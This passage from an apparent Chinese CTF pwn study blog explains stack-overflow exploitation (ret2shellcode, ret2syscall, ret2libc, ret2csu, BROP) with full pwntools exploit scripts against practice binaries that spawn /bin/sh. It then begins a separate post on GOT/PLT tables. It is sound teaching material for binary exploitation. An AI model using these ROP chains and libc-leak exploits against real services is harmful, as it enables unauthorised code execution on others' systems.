开了nx保护（不可执行），可以寻找系统函数和字符串，覆盖返回地址构造执行；</p><h4 id="ret2shellcode："><a href="#ret2shellcode：" class="headerlink" title="ret2shellcode："></a><strong>ret2shellcode：</strong></h4><p>​    什么保护都没有，可以使用gdb的vmmap查看权限，发现bss可执行，直接构造shellcode注入到bss段中</p><p>shellcode的构造方法(完整payload)：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">sh = process(<span class="string">&#x27;./ret2shellcode&#x27;</span>)</span><br><span class="line">shellcode = asm(shellcraft.sh())</span><br><span class="line">buf2_addr = <span class="number">0x804a080</span></span><br><span class="line"></span><br><span class="line">sh.sendline(shellcode.ljust(<span class="number">112</span>, <span class="string">&#x27;A&#x27;</span>) + p32(buf2_addr))</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure><h4 id="ret2syscall"><a href="#ret2syscall" class="headerlink" title="ret2syscall:"></a><strong>ret2syscall:</strong></h4><p>有nx保护的情况下，我们也可以通过系统调用来实现pwn</p><p>​    系统调用和普通库函数调用非常相似，只是系统调用由操作系统内核提供，运行于内核核心态，而普通的库函数调用由函数库或用户自己提供，运行于用户态。</p><p>​    也就是说，我们通过调用内核函数完成system函数的调用，在linux上，系统调用通过<strong>int 80h</strong>实现。</p><p>其中，该程序是 32 位，所以我们需要使：</p><ul><li>系统调用号，即 eax 应该为 0xb</li><li>第一个参数，即 ebx 应该指向 /bin/sh 的地址，其实执行 sh 的地址也可以。</li><li>第二个参数，即 ecx 应该为 0</li><li>第三个参数，即 edx 应该为 0</li></ul><p><strong>使用条件：</strong>其实还是挺苛刻的，程序里必须有指定的指令集，要不就不太方便实现调用</p><p><strong>步骤：</strong>将eax、ebx、ecx、edx赋值，最后调用int 80h</p><p><strong>具体实现：</strong></p><p>首先要在程序中找到上面步骤中提到的这些动作：</p><p>使用命令ropgadgets来找：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">ROPgadget --binary rop  --only &#x27;pop|ret&#x27; | grep &#x27;eax&#x27;</span><br><span class="line">ROPgadget --binary rop  --only &#x27;pop|ret&#x27; | grep &#x27;ebx&#x27;</span><br><span class="line">ROPgadget --binary rop  --string &#x27;/bin/sh&#x27;</span><br><span class="line">ROPgadget --binary rop  --only &#x27;int&#x27;</span><br></pre></td></tr></table></figure><p>找到之后，把地址按照顺序排列调用：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">sh = process(<span class="string">&#x27;./rop&#x27;</span>)</span><br><span class="line"></span><br><span class="line">pop_eax_ret = <span class="number">0x080bb196</span></span><br><span class="line">pop_edx_ecx_ebx_ret = <span class="number">0x0806eb90</span></span><br><span class="line">int_0x80 = <span class="number">0x08049421</span></span><br><span class="line">binsh = <span class="number">0x80be408</span></span><br><span class="line">payload = flat(</span><br><span class="line">    [<span class="string">&#x27;A&#x27;</span> * <span class="number">112</span>, pop_eax_ret, <span class="number">0xb</span>, pop_edx_ecx_ebx_ret, <span class="number">0</span>, <span class="number">0</span>, binsh, int_0x80])</span><br><span class="line">sh.sendline(payload)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure><h4 id="ret2libc"><a href="#ret2libc" class="headerlink" title="ret2libc:"></a>ret2libc:</h4><p>要搞清楚libc，首先要对got、plt表的内容有所了解</p><h5 id="got-amp-plt表"><a href="#got-amp-plt表" class="headerlink" title="got&amp;plt表"></a>got&amp;plt表</h5><p>比如说，我们调用了系统函数scanf，过程是怎么样的呢？<br>    在反编译的text中，出现call的语句并不直接指向scanf函数的真实地址，而是指向<strong>scanf@plt</strong>的地址，我们跳入plt表的相应位置后，会出现一句jmp，让我们再跳到got表上记录的对应位置，也就是真实的，系统调用发生的位置。</p><p><img src="https://cdn.jsdelivr.net/gh/lhl7/My_pics/Typora/342ac65c10385343cc77d15ed5813278cb8088a9.jpeg" alt="img"></p><p>​    所以简单的总结一下，我们调用的时候，填plt的地址，我们得到真实地址，需要got表。</p><p>具体的内容：可以参考相关的另一篇<a href="https://lhl7.github.io/2022/05/08/pwn%E5%85%A5%E9%97%A8%E4%B9%8Bgot&plt%E8%A1%A8/">笔记</a> 明白了两个表之后，我们继续学习libc!</p><p><strong>利用思路：</strong>泄露libc地址，直接调用其中的system函数。</p><p><strong>关键点：</strong></p><ul><li>system 函数属于 libc，而 libc.so 动态链接库中的函数之间相对偏移是固定的。</li><li>即使程序有 ASLR 保护，也只是针对于地址中间位进行随机，最低的 12 位并不会发生改变。而 libc 在 github 上有人进行收集，如下</li><li><a href="https://github.com/niklasb/libc-database">https://github.com/niklasb/libc-database</a></li></ul><p>综上证明了一件事，知道libc中一个函数的地址，就可以知道其他的。、</p><p><strong>常用手法：GOT表泄露</strong></p><p>​    在上文中，我们讲了got表和延迟绑定，我们知道要由于延迟绑定的存在，只能泄露got表中曾经执行过函数的地址。</p><p>​    在得到 libc 之后，其实 libc 中也是有 /bin/sh 字符串的，所以我们可以一起获得 /bin/sh 字符串的地址。</p><p>这里我们泄露 __libc_start_main 的地址，这是因为它是程序最初被执行的地方。</p><p><strong>利用流程：</strong></p><ul><li>泄露 __libc_start_main 地址</li><li>获取 libc 版本</li><li>获取 system 地址与 /bin/sh 的地址</li><li>再次执行源程序</li><li>触发栈溢出执行 system(‘/bin/sh’)</li></ul><p>exp 如下</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> LibcSearcher</span><br><span class="line">sh = process(<span class="string">&#x27;./ret2libc3&#x27;</span>)</span><br><span class="line"></span><br><span class="line">ret2libc3 = ELF(<span class="string">&#x27;./ret2libc3&#x27;</span>)</span><br><span class="line"></span><br><span class="line">puts_plt = ret2libc3.plt[<span class="string">&#x27;puts&#x27;</span>]<span class="comment">#用于后续调用put函数</span></span><br><span class="line">libc_start_main_got = ret2libc3.got[<span class="string">&#x27;__libc_start_main&#x27;</span>]<span class="comment">#获取存储main的got表的地址</span></span><br><span class="line">main = ret2libc3.symbols[<span class="string">&#x27;main&#x27;</span>]</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span> <span class="string">&quot;leak libc_start_main_got addr and return to main again&quot;</span></span><br><span class="line">payload = flat([<span class="string">&#x27;A&#x27;</span> * <span class="number">112</span>, puts_plt, main, libc_start_main_got])</span><br><span class="line"><span class="comment">#关于这里为啥是112偏移，这是由于ida的显示问题，用gdb调试看即可（实际是因为传了两个参数）</span></span><br><span class="line">sh.sendlineafter(<span class="string">&#x27;Can you find it !?&#x27;</span>, payload)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span> <span class="string">&quot;get the related addr&quot;</span></span><br><span class="line">libc_start_main_addr = u32(sh.recv()[<span class="number">0</span>:<span class="number">4</span>])</span><br><span class="line">libc = LibcSearcher(<span class="string">&#x27;__libc_start_main&#x27;</span>, libc_start_main_addr)</span><br><span class="line">libcbase = libc_start_main_addr - libc.dump(<span class="string">&#x27;__libc_start_main&#x27;</span>)</span><br><span class="line">system_addr = libcbase + libc.dump(<span class="string">&#x27;system&#x27;</span>)</span><br><span class="line">binsh_addr = libcbase + libc.dump(<span class="string">&#x27;str_bin_sh&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span> <span class="string">&quot;get shell&quot;</span></span><br><span class="line">payload = flat([<span class="string">&#x27;A&#x27;</span> * <span class="number">104</span>, system_addr, <span class="number">0xdeadbeef</span>, binsh_addr])</span><br><span class="line">sh.sendline(payload)</span><br><span class="line"></span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure><h2 id="0x02-中级ROP"><a href="#0x02-中级ROP" class="headerlink" title="0x02 中级ROP"></a>0x02 中级ROP</h2><h3 id="一、RETCSU——64位ROP"><a href="#一、RETCSU——64位ROP" class="headerlink" title="一、RETCSU——64位ROP"></a>一、RETCSU——64位ROP</h3><p><strong>概述：</strong></p><p>​    retcsu是针对64位的一种溢出构造方法，在 64 位程序中，函数的前 6 个参数是通过寄存器：<strong>rdi, rsi, rdx, rcx, r8, r9</strong>传递的（参看<a href="https://lhl7.github.io/2022/02/26/%E6%B1%87%E7%BC%96_%E5%87%BD%E6%95%B0%E7%9A%84%E8%B0%83%E7%94%A8%E4%BC%A0%E5%8F%82%E8%A7%84%E5%88%99/">调用规则</a>），因此我们要尝试操控寄存器才能达成传参调用我们想调用的函数的效果。 这时候，我们可以利用 x64 下的中的**__libc_csu_init**中的 gadgets。这个函数是用来对 libc 进行初始化操作的，而一般的程序都会调用 libc 函数，所以这个函数一定会存在。（亲测随便找了一个程序还真的有）</p><p><img src="https://cdn.jsdelivr.net/gh/lhl7/My_pics/Typora/image-20220510113213734.png" alt="image-20220510113213734"></p><p>​    虽然不同的版本有所不同，但是这个函数大致流程如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">略一段</span><br><span class="line">__libc_csu_init+<span class="number">54</span>j</span><br><span class="line">.text:<span class="number">0000000000400600</span>                 mov     rdx, r13</span><br><span class="line">.text:<span class="number">0000000000400603</span>                 mov     rsi, r14</span><br><span class="line">.text:<span class="number">0000000000400606</span>                 mov     edi, r15d</span><br><span class="line">.text:<span class="number">0000000000400609</span>                 call    qword ptr [r12+rbx*<span class="number">8</span>]</span><br><span class="line">.text:<span class="number">000000000040060</span>D                 add     rbx, <span class="number">1</span></span><br><span class="line">.text:<span class="number">0000000000400611</span>                 cmp     rbx, rbp</span><br><span class="line">.text:<span class="number">0000000000400614</span>                 jnz     <span class="keyword">short</span> loc_400600</span><br><span class="line">.text:<span class="number">0000000000400616</span></span><br><span class="line">.text:<span class="number">0000000000400616</span> loc_400616:                             ; CODE XREF: __libc_csu_init+<span class="number">34</span>j</span><br><span class="line">.text:<span class="number">0000000000400616</span>                 add     rsp, <span class="number">8</span></span><br><span class="line">.text:<span class="number">000000000040061</span>A                 pop     rbx</span><br><span class="line">.text:<span class="number">000000000040061B</span>                 pop     rbp</span><br><span class="line">.text:<span class="number">000000000040061</span>C                 pop     r12</span><br><span class="line">.text:<span class="number">000000000040061</span>E                 pop     r13</span><br><span class="line">.text:<span class="number">0000000000400620</span>                 pop     r14</span><br><span class="line">.text:<span class="number">0000000000400622</span>                 pop     r15</span><br><span class="line">.text:<span class="number">0000000000400624</span>                 retn</span><br><span class="line">.text:<span class="number">0000000000400624</span> __libc_csu_init endp</span><br></pre></td></tr></table></figure><ul><li>通过0040061A 一直到结尾，可以控制 rbx,rbp,r12,r13,r14,r15 ；</li><li><strong>rdi</strong>：00400606中mov     edi, r15d，给rdi的低32位赋值。</li><li><strong>rsi</strong>：00400603  中   mov     rsi, r14；</li><li><strong>rdx</strong>：00400600中mov     rdx, r13；</li></ul><p>简单地说我们对于寄存器的控制就是：</p><ul><li>利用尾部代码控制了 rbx，rbp，r12，r13，r14，r15。</li><li>利用中间部分的代码控制了 rdx，rsi，edi。</li></ul><p>设置好了这些传参之后，我们可以直接通过00400609进行调用call    qword ptr [r12+rbx*8]（这些寄存器都是我们能够控制的）：</p><ul><li>从 0x000000000040060D 到 0x0000000000400614，我们可以控制 rbx 与 rbp 的之间的关系为 rbx+1 = rbp，这样我们就不会执行jmp loc_400600，进而可以继续执行下面的汇编程序。这里我们可以简单的设置 rbx=0，rbp=1。</li><li>然后我们通过控制r12记录我们要调用的函数地址就可以实现调用。</li></ul><p>给出一个<strong>通用的poc</strong>：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> LibcSearcher</span><br><span class="line"></span><br><span class="line"><span class="comment">#context.log_level = &#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line">level5 = ELF(<span class="string">&#x27;./level5&#x27;</span>)</span><br><span class="line">sh = process(<span class="string">&#x27;./level5&#x27;</span>)</span><br><span class="line"></span><br><span class="line">write_got = level5.got[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">read_got = level5.got[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line">main_addr = level5.symbols[<span class="string">&#x27;main&#x27;</span>]</span><br><span class="line">bss_base = level5.bss()</span><br><span class="line">csu_front_addr = <span class="number">0x0000000000400600</span></span><br><span class="line">csu_end_addr = <span class="number">0x000000000040061A</span></span><br><span class="line">fakeebp = <span class="string">&#x27;b&#x27;</span> * <span class="number">8</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">csu</span>(<span class="params">rbx, rbp, r12, r13, r14, r15, last</span>):</span></span><br><span class="line">    <span class="comment"># 七个参数的作用：</span></span><br><span class="line">    <span class="comment"># 参数rbx、rbp固定为0 1;</span></span><br><span class="line">    <span class="comment"># 参数r12为需要调用函数的地址其实就是返回地址；</span></span><br><span class="line">    <span class="comment"># 参数r13、r14、r15为三个参数；</span></span><br><span class="line">    <span class="comment"># 参数last为r12处函数执行完后的返回地址</span></span><br><span class="line">    payload = <span class="string">&#x27;a&#x27;</span> * <span class="number">0x80</span> + fakeebp</span><br><span class="line">    payload += p64(csu_end_addr) + p64(rbx) + p64(rbp) + p64(r12) + p64(</span><br><span class="line">        r13) + p64(r14) + p64(r15)</span><br><span class="line">    payload += p64(csu_front_addr)</span><br><span class="line">    payload += <span class="string">&#x27;a&#x27;</span> * <span class="number">0x38</span></span><br><span class="line">    payload += p64(last)</span><br><span class="line">    sh.send(payload)</span><br><span class="line">    sleep(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">sh.recvuntil(<span class="string">&#x27;Hello, World\n&#x27;</span>)</span><br><span class="line"><span class="comment">## RDI, RSI, RDX, RCX, R8, R9, more on the stack</span></span><br><span class="line"><span class="comment">## write(1,write_got,8)</span></span><br><span class="line">csu(<span class="number">0</span>, <span class="number">1</span>, write_got, <span class="number">8</span>, write_got, <span class="number">1</span>, main_addr)</span><br><span class="line"><span class="comment"># 调用write函数输出write函数got表的值，泄露libc，然会返回到main函数</span></span><br><span class="line"></span><br><span class="line">write_addr = u64(sh.recv(<span class="number">8</span>))</span><br><span class="line">libc = LibcSearcher(<span class="string">&#x27;write&#x27;</span>, write_addr)</span><br><span class="line">libc_base = write_addr - libc.dump(<span class="string">&#x27;write&#x27;</span>)</span><br><span class="line">execve_addr = libc_base + libc.dump(<span class="string">&#x27;execve&#x27;</span>)</span><br><span class="line">log.success(<span class="string">&#x27;execve_addr &#x27;</span> + <span class="built_in">hex</span>(execve_addr))</span><br><span class="line"><span class="comment">##gdb.attach(sh)</span></span><br><span class="line"><span class="comment">#计算libc基地址，然后计算execve函数的地址，</span></span><br><span class="line"></span><br><span class="line"><span class="comment">## read(0,bss_base,16)</span></span><br><span class="line"><span class="comment">## read execve_addr and /bin/sh\x00</span></span><br><span class="line">sh.recvuntil(<span class="string">&#x27;Hello, World\n&#x27;</span>)</span><br><span class="line">csu(<span class="number">0</span>, <span class="number">1</span>, read_got, <span class="number">16</span>, bss_base, <span class="number">0</span>, main_addr)</span><br><span class="line"><span class="comment">#调用read函数在bss段写入/bin/sh\x00字段，返回到main函数</span></span><br><span class="line">sh.send(p64(execve_addr) + <span class="string">&#x27;/bin/sh\x00&#x27;</span>)</span><br><span class="line"></span><br><span class="line">sh.recvuntil(<span class="string">&#x27;Hello, World\n&#x27;</span>)</span><br><span class="line"><span class="comment">## execve(bss_base+8)</span></span><br><span class="line">csu(<span class="number">0</span>, <span class="number">1</span>, bss_base, <span class="number">0</span>, <span class="number">0</span>, bss_base + <span class="number">8</span>, main_addr)</span><br><span class="line">//</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure><p>在csu(0, 1, write_got, 8, write_got, 1, main_addr)执行时，实际的处理顺序如下所示：</p><p><img src="https://cdn.jsdelivr.net/gh/lhl7/My_pics/Typora/image-20220513152245754.png" alt="image-20220513152245754"></p><p>​    那么，既然这个csu这么牛，难道是通用的嘛，其实这个溢出的关键问题是溢出的位数太多了，如果只能溢出一小段，那就不好使了。</p><p>​    同时，在多种其他的ROP手段中，我们也常常利用到 __libc_csu_init 函数进行rop，彼时我们可能希望能够控制更多的寄存器。我们利用上述一大段pop时，可以通过设置偏移来影响其他的寄存器如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line">gef➤  x/5i 0x000000000040061A  #原偏移量，控制原有的六个寄存器</span><br><span class="line">   0x40061a &lt;__libc_csu_init+90&gt;:   pop    rbx</span><br><span class="line">   0x40061b &lt;__libc_csu_init+91&gt;:   pop    rbp</span><br><span class="line">   0x40061c &lt;__libc_csu_init+92&gt;:   pop    r12</span><br><span class="line">   0x40061e &lt;__libc_csu_init+94&gt;:   pop    r13</span><br><span class="line">   0x400620 &lt;__libc_csu_init+96&gt;:   pop    r14</span><br><span class="line">gef➤  x/5i 0x000000000040061b#改变偏移控制rbp</span><br><span class="line">   0x40061b &lt;__libc_csu_init+91&gt;:   pop    rbp</span><br><span class="line">   0x40061c &lt;__libc_csu_init+92&gt;:   pop    r12</span><br><span class="line">   0x40061e &lt;__libc_csu_init+94&gt;:   pop    r13</span><br><span class="line">   0x400620 &lt;__libc_csu_init+96&gt;:   pop    r14</span><br><span class="line">   0x400622 &lt;__libc_csu_init+98&gt;:   pop    r15</span><br><span class="line">gef➤  x/5i 0x000000000040061A+3#改变偏移控制rsp</span><br><span class="line">   0x40061d &lt;__libc_csu_init+93&gt;:   pop    rsp</span><br><span class="line">   0x40061e &lt;__libc_csu_init+94&gt;:   pop    r13</span><br><span class="line">   0x400620 &lt;__libc_csu_init+96&gt;:   pop    r14</span><br><span class="line">   0x400622 &lt;__libc_csu_init+98&gt;:   pop    r15</span><br><span class="line">   0x400624 &lt;__libc_csu_init+100&gt;:  ret</span><br><span class="line">gef➤  x/5i 0x000000000040061e</span><br><span class="line">   0x40061e &lt;__libc_csu_init+94&gt;:   pop    r13</span><br><span class="line">   0x400620 &lt;__libc_csu_init+96&gt;:   pop    r14</span><br><span class="line">   0x400622 &lt;__libc_csu_init+98&gt;:   pop    r15</span><br><span class="line">   0x400624 &lt;__libc_csu_init+100&gt;:  ret</span><br><span class="line">   0x400625:    nop</span><br><span class="line">gef➤  x/5i 0x000000000040061f</span><br><span class="line">   0x40061f &lt;__libc_csu_init+95&gt;:   pop    rbp</span><br><span class="line">   0x400620 &lt;__libc_csu_init+96&gt;:   pop    r14</span><br><span class="line">   0x400622 &lt;__libc_csu_init+98&gt;:   pop    r15</span><br><span class="line">   0x400624 &lt;__libc_csu_init+100&gt;:  ret</span><br><span class="line">   0x400625:    nop</span><br><span class="line">gef➤  x/5i 0x0000000000400620</span><br><span class="line">   0x400620 &lt;__libc_csu_init+96&gt;:   pop    r14</span><br><span class="line">   0x400622 &lt;__libc_csu_init+98&gt;:   pop    r15</span><br><span class="line">   0x400624 &lt;__libc_csu_init+100&gt;:  ret</span><br><span class="line">   0x400625:    nop</span><br><span class="line">   0x400626:    nop    WORD PTR cs:[rax+rax*1+0x0]</span><br><span class="line">gef➤  x/5i 0x0000000000400621#改变拍偏移控制rsi、以及下面的rdi</span><br><span class="line">   0x400621 &lt;__libc_csu_init+97&gt;:   pop    rsi</span><br><span class="line">   0x400622 &lt;__libc_csu_init+98&gt;:   pop    r15</span><br><span class="line">   0x400624 &lt;__libc_csu_init+100&gt;:  ret</span><br><span class="line">   0x400625:    nop</span><br><span class="line">gef➤  x/5i 0x000000000040061A+9</span><br><span class="line">   0x400623 &lt;__libc_csu_init+99&gt;:   pop    rdi</span><br><span class="line">   0x400624 &lt;__libc_csu_init+100&gt;:  ret</span><br><span class="line">   0x400625:    nop</span><br><span class="line">   0x400626:    nop    WORD PTR cs:[rax+rax*1+0x0]</span><br><span class="line">   0x400630 &lt;__libc_csu_fini&gt;:  repz ret</span><br></pre></td></tr></table></figure><h3 id="二、BROP"><a href="#二、BROP" class="headerlink" title="二、BROP"></a>二、BROP</h3><p>​    BROP 是没有对应应用程序的源代码或者二进制文件下，对程序进行攻击，劫持程序的执行流（这么叼？？？）。</p><h4 id="攻击条件："><a href="#攻击条件：" class="headerlink" title="攻击条件："></a>攻击条件：</h4><ol><li>源程序必须存在栈溢出漏洞，以便于攻击者可以控制程序流程。</li><li>服务器端的进程在崩溃之后会重新启动，并且重新启动的<strong>进程的地址</strong>与先前的地址一样（这也就是说即使程序有 ASLR 保护，但是其只是在程序最初启动的时候有效果，也就是程序不能开pie）。目前 nginx, MySQL, Apache, OpenSSH 等服务器应用都是符合这种特性的。</li></ol><h4 id="攻击流程："><a href="#攻击流程：" class="headerlink" title="攻击流程："></a>攻击流程：</h4><p>参考例子。</p><h4 id="举个例子："><a href="#举个例子：" class="headerlink" title="举个例子："></a>举个例子：</h4><p><a href="https://lhl7.github.io/2022/05/17/pwn_hctf2016-brop_writeup/">https://lhl7.github.io/2022/05/17/pwn_hctf2016-brop_writeup/</a></p><h2 id="0x03-高级ROP"><a href="#0x03-高级ROP" class="headerlink" title="0x03 高级ROP"></a>0x03 高级ROP</h2><p>高级 ROP 其实和一般的 ROP 基本一样，其主要的区别在于它利用了一些更加底层的原理。</p><h3 id="一、ret2dlresolve"><a href="#一、ret2dlresolve" class="headerlink" title="一、ret2dlresolve"></a>一、ret2dlresolve</h3><p>参考：<a href="https://lhl7.github.io/2022/05/08/pwn%E5%85%A5%E9%97%A8%E4%B9%8Bgot&amp;plt%E8%A1%A8/">https://lhl7.github.io/2022/05/08/pwn%E5%85%A5%E9%97%A8%E4%B9%8Bgot&amp;plt%E8%A1%A8/</a></p><p>提到</p>]]></content>
      
      
      <categories>
          
          <category> pwn </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>pwn入门之got和plt表</title>
      <link href="/2022/05/08/pwn%E5%85%A5%E9%97%A8%E4%B9%8Bgot%E5%92%8Cplt%E8%A1%A8/"/>
      <url>/2022/05/08/pwn%E5%85%A5%E9%97%A8%E4%B9%8Bgot%E5%92%8Cplt%E8%A1%A8/</url>
      
        <content type="html"><![CDATA[<h1 id="pwn入门之got和plt表"><a href="#pwn入门之got和plt表" class="headerlink" title="pwn入门之got和plt表"></a>pwn入门之got和plt表</h1><p>​    本文摘自：<a href="https://linyt.blog.csdn.net/?type=blog">https://linyt.blog.csdn.net/?type=blog</a> CSDN博主「海枫」博客，感谢大佬详细的教程，仅供个人学习使用，请参考原文：</p><p><a href="https://blog.csdn.net/linyt/article/details/51635768">https://blog.csdn.net/linyt/article/details/51635768</a><br><a href="https://blog.csdn.net/linyt/article/details/51636753">https://blog.csdn.net/linyt/article/details/51636753</a><br><a href="https://blog.csdn.net/linyt/article/details/51637832">https://blog.csdn.net/linyt/article/details/51637832</a><br><a href="https://linyt.blog.csdn.net/article/details/51893258">https://linyt.blog.csdn.net/article/details/51893258</a></p><h2 id="0x01-什么是got-amp-plt表"><a href="#0x01-什么是got-amp-plt表" class="headerlink" title="0x01 什么是got&amp;plt表"></a>0x01 什么是got&amp;plt表</h2><p><img src="https://cdn.jsdelivr.net/gh/lhl7/My_pics/Typora/image-20220508133405845.png" alt="image-20220508133405845"></p><p>​    简单的说，调用系统函数时，调用语句并不直接指向glibc，而是指向plt表中该函数的地址，plt表中该函数中记录了一句jmp指令，指令的参数为got表中的值。最后，通过plt表的跳转，跳到glibc的实际位置进行调用。</p><p>​    那么，<strong>plt表</strong>就是与函数调用相映射的<strong>跳板</strong>，用于跳到glibc的函数；而跳板需要一个<strong>地图</strong>，记录glibc中函数的位置，这个地图就是<strong>got表</strong>。</p><h2 id="0x02-got表存在的意义何在"><a href="#0x02-got表存在的意义何在" class="headerlink" title="0x02 got表存在的意义何在"></a>0x02 got表存在的意义何在</h2><p>​    写c代码的时候，是没有库函数地址的，写完的东西也只是ascii，没有任何作用。</p><p>​    编译、链接的时候我们把c变成汇编，汇编再变成机器码，形成可执行文件格式（windows下的PE、linux下的elf）。这时候，一个elf拿在手里，这个elf里的系统调用可以有地址吗？答曰：无。</p><p>​    因为我们这个elf在各种系统上跑，也不一定是用的<strong>glibc</strong>库（即使确定是，加载的位置也可能不同），因此这个地址完全不能确定。也就是说，编译运行后的可执行文件里也没有地址。那么，哪有地址？</p><p>​    我们可以在程序运行之前，额外运行一个程序把地址装载到call指令的后面的操作数中，这样源程序就是一个有地址的程序了，可以吗？答曰：依然不行，有两条原因：</p><ul><li>现代操作系统不允许修改<strong>代码段</strong>，只能修改<strong>数据段</strong></li><li>如果print_banner函数是在一个动态库（.so对象）内，修改了代码段，那么它就无法做到系统内所有进程<strong>共享</strong>同一个动态库。</li></ul><p>​    由于这样的背景，我们就必须要在代码段之外，也就是数据段中添加一个表格，来记录系统函数的地址，在运行的时候，把真正的地址装填进去，然后在代码段去调用数据段的内容就可以了。这里的数据段中记录函数地址的表，就是<strong>GOT表</strong>。那么这个找地址的事情由谁来做呢，就是<strong>动态链接器</strong>。</p><h2 id="0x03-got表的地址被调用前，如何实现装填（延迟绑定）"><a href="#0x03-got表的地址被调用前，如何实现装填（延迟绑定）" class="headerlink" title="0x03 got表的地址被调用前，如何实现装填（延迟绑定）"></a>0x03 got表的地址被调用前，如何实现装填（延迟绑定）</h2><p>​    首先，什么是延迟绑定？</p><p>​    